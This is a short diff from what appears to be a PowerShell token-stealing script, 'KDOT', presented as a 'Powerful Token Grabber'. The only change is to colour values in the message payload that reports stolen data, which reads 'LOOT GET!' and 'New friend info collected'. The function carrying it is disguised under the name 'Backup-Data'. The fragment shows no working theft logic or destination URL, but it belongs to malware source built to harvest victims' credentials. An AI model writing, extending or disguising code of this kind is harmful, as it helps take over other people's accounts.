@@ -663,14 +663,14 @@ function Backup-Data {
         "content" = "Haiii I just grabbed some loot :3"
         "title" = "KDOT"
         "description" = "Powerful Token Grabber"
-        "color" = "E91E63"
+        "color" = "3447003"
         "url" = ""
         "embeds" = @(
             @{
                 "title" = "LOOT GET!"
                 "url" = ""
                 "description" = "New friend info collected !"
-                "color" = "E91E63"
+                "color" = "3447003"
                 "footer" = @{
                     "text" = "Have fun! :p"
                 }
